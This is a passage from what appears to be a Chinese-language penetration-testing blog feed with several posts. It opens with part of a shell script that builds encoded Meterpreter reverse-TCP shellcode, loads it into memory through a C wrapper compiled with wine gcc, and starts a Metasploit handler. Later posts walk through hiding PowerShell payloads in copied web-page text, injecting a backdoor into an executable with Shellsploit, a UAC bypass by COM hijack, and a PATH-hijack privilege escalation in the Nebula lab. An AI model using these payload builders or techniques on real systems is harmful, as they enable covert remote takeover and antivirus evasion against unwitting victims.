class="emphasis">  echo -e &quot;       secist&gt;请输入你的端口: \c&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  read port</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo -e &quot;       secist&gt;编码次数(1-500): \c&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  read encode</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo  $( msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=$ip  LPORT=$port -e x86/shikata_ga_nai -b &#x27;\x00&#x27; -i $encode -f c) | sed &#x27;s/unsigned char buf\[\] =//g&#x27; &gt;&gt; output/shellcode.txt</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  Shellcode=$(cat output/shellcode.txt)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo  &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  # include <span class="language-xml"><span class="tag">&lt;<span class="name">stdlib.h</span>&gt;</span></span></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  # include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  # include <span class="language-xml"><span class="tag">&lt;<span class="name">string.h</span>&gt;</span></span></span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  # include <span class="language-xml"><span class="tag">&lt;<span class="name">windows.h</span>&gt;</span></span></span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  int</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  main(void)</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  &#123;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  char *shellcode =</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">    $Shellcode</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  DWORD why_must_this_variable;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  BOOL ret = VirtualProtect(shellcode, strlen(shellcode),</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  PAGE_EXECUTE_READWRITE, &amp;why_must_this_variable);</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  if (!ret) &#123;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  printf(\&quot;VirtualProtect\n\&quot;);</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  return EXIT_FAILURE;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  &#125;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  ((void(*)(void))shellcode)();</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  return 0;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  &#125;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  &quot; &gt;&gt; output/shellcode.cpp</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  wine gcc -m32 -W -Wall -o output/shellcode.exe output/shellcode.cpp</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  rm output/shellcode.txt output/shellcode.cpp</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo -e &quot;  +------------++-------------------------++-----------------------+&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo -e &quot;  | Name       ||  Descript             || Your Input             &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo -e &quot;  +------------++-------------------------++-----------------------+&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo -e &quot;  | LHOST      ||  The Listen Addres      || $ip                    &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo -e &quot;  | LPORT      ||  The Listen Ports       || $port                  &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo -e &quot;  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   &quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo -e &quot;  +------------++-------------------------++-----------------------+&quot;</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo &quot;use exploit/multi/handler&quot; &gt;&gt; resource/handler.rc</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo &quot;set PAYLOAD $payload&quot; &gt;&gt; resource/handler.rc</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo &quot;set LHOST $ip&quot; &gt;&gt;  resource/handler.rc</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo &quot;set LPORT $port&quot; &gt;&gt;  resource/handler.rc</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  echo &quot;exploit &quot; &gt;&gt;  resource/handler.rc</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">  msfconsole -r  resource/handler.rc</span></span></span><br><span class="line"><span class="strong"><span class="emphasis">&#125;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="关注一下"><a href="#关注一下" class="headerlink" title="关注一下"></a>关注一下</h2><p> 我已在GitHub中上传了相关脚本文件 各位可以自行下载和点个星关注下我们即刻安全<br> <a href="https://github.com/demonsec666/secist_script">https://github.com/demonsec666/secist_script</a></p><p> 欢迎加入即刻安全技术群，与我一起讨论 。群号:307283889</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pastezort|MSF|Powershell |kali linux 2017</title>
      <link href="/pastezort.html"/>
      <url>/pastezort.html</url>
      
        <content type="html"><![CDATA[<pre>今天看到一个国外不错的视频是通过讲msf的payload，生成powershell以及base64代码，嵌入到js当中，js复制内容到剪贴板，比较隐蔽。那个payload 我之前http://www.ggsec.cn/Metasploit6.html msf第6课有出现过，但是没有像他那样出现在网页当中，思路也是不错的。</pre><p>GitHub： <a href="https://github.com/ZettaHack/PasteZort">https://github.com/ZettaHack/PasteZort</a><br>youtube：<a href="https://www.youtube.com/watch?v=3Q0xqbDP1Cc">https://www.youtube.com/watch?v=3Q0xqbDP1Cc</a> </p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/PasteZort1.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="1-下载并运行"><a href="#1-下载并运行" class="headerlink" title="1.下载并运行"></a>1.下载并运行</h2><p><font color="#FF0000"><pre><br>git clone <a href="https://github.com/ZettaHack/PasteZort.git">https://github.com/ZettaHack/PasteZort.git</a><br></pre></font><br><font color="#FF0000"><pre><br>python PasteZ0rt.py<br></pre></font></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505383015483.jpg" alt="enter description here"></p><h2 id="2-选择平台"><a href="#2-选择平台" class="headerlink" title="2.选择平台"></a>2.选择平台</h2><p>选择目标平台，我这里已windows为主，选择1号 windows。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505383578206.jpg" alt="enter description here"></p><h2 id="3-选择payload"><a href="#3-选择payload" class="headerlink" title="3.选择payload"></a>3.选择payload</h2><p>选择msf的payload，我这边选择的还是1，（个人还是比较喜欢以windows&#x2F;meterpreter&#x2F;reverse_tcp为主）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505383636049.jpg" alt="enter description here"></p><h2 id="4-填写IP和端口"><a href="#4-填写IP和端口" class="headerlink" title="4.填写IP和端口"></a>4.填写IP和端口</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505383836319.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505383879631.jpg" alt="enter description here"></p><h2 id="5-随意填写一些网页信息，并同时开启apache服务"><a href="#5-随意填写一些网页信息，并同时开启apache服务" class="headerlink" title="5.随意填写一些网页信息，并同时开启apache服务"></a>5.随意填写一些网页信息，并同时开启apache服务</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505383922766.jpg" alt="enter description here"></p><p> 6.可以看到红色字体区域有个地址<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505383939438.jpg" alt="enter description here"></p><p>7.打开地址我们可以看到 我们刚刚随意输入的一些内容<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505383984321.jpg" alt="enter description here"></p><p>8.可以看到 内容隐藏这一些powershell的恶意代码，如果用户不小心点击 或者复制其内容 ，却容易中招<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505384146550.jpg" alt="enter description here"></p><p>9.开启msf监听 ，选择y<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505384364997.jpg" alt="enter description here"></p><p>已经自动化帮我们设置完毕<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505384574985.jpg" alt="enter description here"></p><p>10.将demon secist这些文字内容复制到cmd中运行，得到会话<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505384314337.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505385071941.jpg" alt="enter description here"></p><p>powershell进程开启，杀软并无反应<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505385328692.jpg" alt="enter description here"></p><p>得到最终会话<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505385603886.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Secist_Script</title>
      <link href="/secist-EN.html"/>
      <url>/secist-EN.html</url>
      
        <content type="html"><![CDATA[<iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Secist_EN.mp4'    frameborder="0"     allowfullscreen></iframe><p>我已经做了这个脚本的视频并且做了中英文版<br><a href="https://github.com/demonsec666/secist_script">https://github.com/demonsec666/secist_script</a><br>并且我已经上传了Youtube<br><a href="https://www.youtube.com/watch?v=Wg7HuU9Hypw&t=11s">https://www.youtube.com/watch?v=Wg7HuU9Hypw&amp;t=11s</a></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shellsploit注入器</title>
      <link href="/Shellsploit.html"/>
      <url>/Shellsploit.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CCBB884B3A332CE78495754A559F9580.png" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Shellsploit1.mp4'    frameborder="0"     allowfullscreen></iframe><p>Shellsploit让您为各种操作系统生成自定义的shellcode，后门，注入器。让我们通过编码器对每个字节进行混淆。<br>github:<a href="https://github.com/vasco2016/shellsploit-framework">https://github.com/vasco2016/shellsploit-framework</a></p><pre>Dependencesroot$ sudo pip install capstoneroot$ sudo pip install readline(Not necessary for windows coz preinstalled in shellsploit)root$ sudo pip install pefileroot$ sudo pip install coloramaroot$ sudo pip install pylzma安装Pip在两个windows / nix机器上都没有问题。现在你可以安装：root$ python setup.py --s/ --setup install root$ chmod +x shellsploit (if you are using windows just pass this step)root$ ./shellsploit</pre><p>&nbsp;<br>1.使用shellsploit,可以看到 运行界面，其实使用方法和msf类似，差不多！<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503574995795.jpg" alt="enter description here"><br>&nbsp;<br>2.比如我在这里查看injectors注入模块</p><pre>ssf> show injectors</pre><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503578720910.jpg" alt="enter description here"><br>&nbsp;<br>3.使用injectors模块其中一个</p><pre>ssf>use injectors/Windows/BFD/Patching</pre><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503578920061.jpg" alt="enter description here"><br>&nbsp;<br>4.查看下他里面有什么选项—(其实和msf设置方法差不多)</p><pre>ssf:injectors/Windows/BFD/Patching > show options</pre><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579069699.jpg" alt="enter description here"><br>&nbsp;<br>5.剩下的设置file 、host、port 这些选择，进行一些设置，其中的file选择 我已经将模板放到了目录当中。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579401918.jpg" alt="enter description here"><br>&nbsp;<br>6.进行Payload注入,注入后的模板放入到了 —-File &#x2F;root&#x2F;shellsploit-framework&#x2F;704125575&#x2F;ludashi.exe</p><pre>ssf:injectors/Windows/BFD/Patching > inject</pre><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579556643.jpg" alt="enter description here"><br>&nbsp;<br>7.使用NC进行监听<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579734464.jpg" alt="enter description here"><br>&nbsp;<br>8.打开payload 得到会话。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579888685.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579977420.jpg" alt="enter description here"><br>&nbsp;<br>这里可能有些小小的BUG 。但是依然不影响可以得到会话。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579900646.jpg" alt="enter description here"><br>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploit-Exercises--00&amp;01笔记</title>
      <link href="/exploit-exercises00-01.html"/>
      <url>/exploit-exercises00-01.html</url>
      
        <content type="html"><![CDATA[<p>   决定和你们分享一下，这个东西真的好玩 ！刺激！！给力！！！<br><a href="https://exploit-exercises.com/">https://exploit-exercises.com/</a><br>exploit-exercises.com提供了各种虚拟机，文档和挑战，可用于了解各种计算机安全问题，例如特权升级，漏洞分析，漏洞开发，调试，逆向工程和一般网络安全问题。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502722644808.jpg" alt="enter description here"><br>&nbsp;<br>那么我们就现在来一盘紧张又刺激的漏洞利用练习吧</p><h2 id="1-下载Nebula"><a href="#1-下载Nebula" class="headerlink" title="1.下载Nebula"></a>1.下载Nebula</h2><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502722759188.jpg" alt="enter description here"><br>&nbsp;<br>点击下载  &#x3D;&gt; <a href="https://drive.google.com/drive/folders/0B9RbZkKdRR8qLWZBcVBvanlLb1U">https://drive.google.com/drive/folders/0B9RbZkKdRR8qLWZBcVBvanlLb1U</a><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502722799436.jpg" alt="enter description here"><br>&nbsp;</p><ol start="2"><li>登录使用。下载完以后呢和我使用的界面是一样的<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502722954976.jpg" alt="enter description here"><br>&nbsp;</li></ol><h2 id="3-level00"><a href="#3-level00" class="headerlink" title="3. level00"></a>3. level00</h2><p>关于<br>此级别要求您找到将作为“flag00”帐户运行的设置用户ID程序。您还可以通过仔细查看&#x2F;可疑目录中的顶级目录来找到此信息。<br>要访问此级别，请使用level00的密码登录为level00。<br>进来以后我们看到用户id是level00<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502723067209.jpg" alt="enter description here"><br>&nbsp;<br>那么我找了找在home目录中发现有很多文件夹 分别查看了使用权限。可以看到level00和flag00 这两个文件夹只有属于level00这个用户级别的 。其他的文件夹属于其他的用户的级别。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502723257201.jpg" alt="enter description here"><br>&nbsp;<br>其实到了这里，个人的思路也就断了 ，不得已从网上找了一份答案 做了一个参考<br>这位作者呢通过用户名和用户组去搜索命令,于是跟着他的思路走着，找到了第一条flag<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502723537152.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502723697755.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502723682632.jpg" alt="enter description here"><br>&nbsp;<br>越权成功<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502723847331.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502723912161.jpg" alt="enter description here"><br><a href="http://www.cnblogs.com/zealoct/p/3511762.html">http://www.cnblogs.com/zealoct/p/3511762.html</a></p><h2 id="4-level01"><a href="#4-level01" class="headerlink" title="4. level01"></a>4. level01</h2><p>在下面的程序中有一个漏洞，允许任意程序被执行，你能找到吗？<br>无奈我还是做了弊，看了视频才知道是怎么回事！<br><a href="https://www.youtube.com/watch?v=-mtOlyxyJx4">https://www.youtube.com/watch?v=-mtOlyxyJx4</a><br>要做这个级别，请使用密码level01作为level01帐户登录 。该级别的文件可以在&#x2F; home&#x2F;flag01中找到。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502728157477.jpg" alt="enter description here"></p><p>&nbsp;<br>进入level01这个账户后根据提示在&#x2F; home&#x2F;flag01，发现有flag01这个文件 ，我尝试的执行这个文件 得到了 and now what?输出<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502724658968.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502724739752.jpg" alt="enter description here"><br>&nbsp;<br>根据源代码可以看到<br>setresuid（）设置调用进程的真实用户ID，有效用户ID和保存的set-user-ID。<br>非特权用户进程可以将真实的UID，有效的UID和保存的set-user-ID，各自改为以下之一：当前的真实UID，当前有效UID或当前保存的set-user-ID。<br>特权进程（在Linux上，具有CAP_SETUID功能的进程）可以将真正的UID，有效的UID和保存的set-user-ID设置为任意值。<br>setresgid（）设置真正的GID，有效的GID和保存的调用进程的set-group-ID（并且始终将文件系统GID修改为与有效GID相同），对非特权进程具有相同的限制。</p><p>关键点还是在&#x2F;usr&#x2F;bin&#x2F;env  ，源代码中使用system 调用系统命令 ，使用env 这个命令，去输出 and now what?这个字符串<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502725094137.jpg" alt="enter description here"><br>&nbsp;<br>Linux系统里的env命令  可以显示当前用户的环境变量，还可以用来在指定环境变量下执行其他命令。下面来比较一下set，env和export命令的异同：set命令显示当前shell的变量，包括当前用户的变量;env命令显示当前用户的变量;export命令显示当前导出成用户变量的shell变量。每个shell有自己特有的变量（set）显示的变量，这个和用户变量是不同的，当前用户变量和你用什么shell无关，不管你用什么shell都在，比如HOME，SHELL等这些变量，但shell自己的变量不同shell是不同的，比如BASH_ARGC，BASH等，这些变量只有set才会显示，是bash特有的，export不加参数的时候，显示哪些变量被导出成了用户变量，因为一个shell自己的变量可以通过export “导出”变成一个用户变量。</p><p>  可以看到 在PATH 中环境变量中有带s的，意思就是spuer了，在视频中大牛进行了用户环境变量（包括源代码中 也是使用env 中 去输出字符串）<br>进行特定的权限赋予。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502725817587.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502725890574.jpg" alt="enter description here"><br>可以对比 对用户变量的前后改变<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502725863568.jpg" alt="enter description here"><br>&nbsp;<br>当我再次运行的时候发现是失败的，原因是出在那呢<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502726363846.jpg" alt="enter description here"><br>&nbsp;<br>这意味着我们可以提供我们自己的echo，修改路径，以便这个echo被调用优先于内置，然后我们可以运行任意命令。<br>当然是少了echo 这个文件<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502726983220.jpg" alt="enter description here"><br>&nbsp;<br>越权成功，得到了flag<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502727689578.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypassuac_Comhijack ---kali linux</title>
      <link href="/bypassuac-comhijack.html"/>
      <url>/bypassuac-comhijack.html</url>
      
        <content type="html"><![CDATA[<p> 前天看了一个国外大牛的视频，觉得很有意思。就决定和你们分享一下<br> <a href="https://www.youtube.com/watch?v=HNRrmfuTRCY">https://www.youtube.com/watch?v=HNRrmfuTRCY</a><br> <a href="https://securityonline.info/metasploit-add-com-class-id-hijack-method-bypassing-uac-windows-x86-x64-7810200820122016/">https://securityonline.info/metasploit-add-com-class-id-hijack-method-bypassing-uac-windows-x86-x64-7810200820122016/</a></p><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>简称  用户帐户控制，  UAC  是Windows Vista中引入了通过防止程序的管理权限，除非批准的用户提供额外的安全功能。以下是用户在尝试运行程序或访问需要许可的Windows的一部分时可能看到的UAC确认对话框的图片。</p><p> Metasploit模块<br> <a href="https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb">https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb</a><br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502454208280.jpg" alt="enter description here"></p><p> 该模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些高完整性流程时，将引用这些注册表项，从而导致加载用户控制的DLL的进程。这些DLL包含导致高级会话的有效载荷。有效负载调用后清除注册表项的修改。该模块需要有效负载的架构来匹配操作系统，但目前的低权限Meterpreter会话架构可能不同。如果在单独的进程中启动有效负载后指定EXE :: Custom，您的DLL应该调用ExitProcess（）。该模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，则此模块将无法正常运行。</p><p> （以上引用大神文章）</p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/bypassuac_comhijack.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp; <p> 1.下载bypassuac_comhijack.rb<br> <pre><br> curl -o bypassuac_comhijack.rb <a href="https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb">https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb</a><br> </pre><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502438764029.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>2.将下载的bypassuac_comhijack.rb 剪贴到msf 中<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502438764029.jpg" alt="enter description here"><br>&nbsp;</p><ol start="3"><li>需要的到一个Meterprerter的会话</li></ol><p>比如我这里使用我个人的脚本,第三个得到Meterprerter的会话。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502454345346.jpg" alt="enter description here"><br>&nbsp;</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502454478100.jpg" alt="enter description here"><br>&nbsp;</p><p>3.使用bypassuac_comhijack<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502454553056.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502454631936.jpg" alt="enter description here"><br>&nbsp;<br>看到需要设置的是会话序列号，我这里设置 session 为 1，并且执行payload的时候，会报错，让我们看看需要更改的地方？<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502454757164.jpg" alt="enter description here"><br>&nbsp;<br>因为目标虚拟机win10镜像本身是x64架构的，所以我们这里需要更改payload<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502454854556.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502454868195.jpg" alt="enter description here"><br>&nbsp;<br>并且更改端口<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502454885362.jpg" alt="enter description here"><br>&nbsp;<br>（PS:如果目标机是32位的话，不用更改PAYLOAD 只需更改端口即可）</p><p>4.得到session 2<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502455024735.jpg" alt="enter description here"><br>&nbsp;<br>这里可以看到 我getuid的时候 是demon 用户<br>当我getsystem的时候 ，得到了system权限。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502455140138.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Secist_GUI2</title>
      <link href="/secist-GUI2.html"/>
      <url>/secist-GUI2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8316A7265788A8F69153846ECABD9C65.png" alt="enter description here"></p><span id="more"></span><pre><code>github =&gt; https://github.com/demonsec666/secist_GUI#secist_gui</code></pre><p>继 <a href="http://www.ggsec.cn/secsit-GUI.html">http://www.ggsec.cn/secsit-GUI.html</a> 之后 我将之前的<a href="https://github.com/demonsec666/secist_script">https://github.com/demonsec666/secist_script</a>  命令行版 改写成ruby版 使用GTK、xterm等 环境开发，进行一些小小的改动和编写。其中在xterm 中 使用鼠标将字体选中 是复制 ，Shift-insert是粘贴<br>   如果有更好的建议或者代码可优化的话 可以联系我，非常感谢！！！！！<br> &nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502031157087.jpg" alt="enter description here"></p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><pre>1. git clone https://github.com/demonsec666/secist_GUI.git2. chmod -R 777 .3. ./setup4. wine tdm64-gcc-5.1.0-2\ \(1\).exe </pre><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1502031320810.jpg" alt="enter description here"></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/secist_GUI2.mp4'    frameborder="0"     allowfullscreen></iframe>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>steghide</title>
      <link href="/steghide.html"/>
      <url>/steghide.html</url>
      
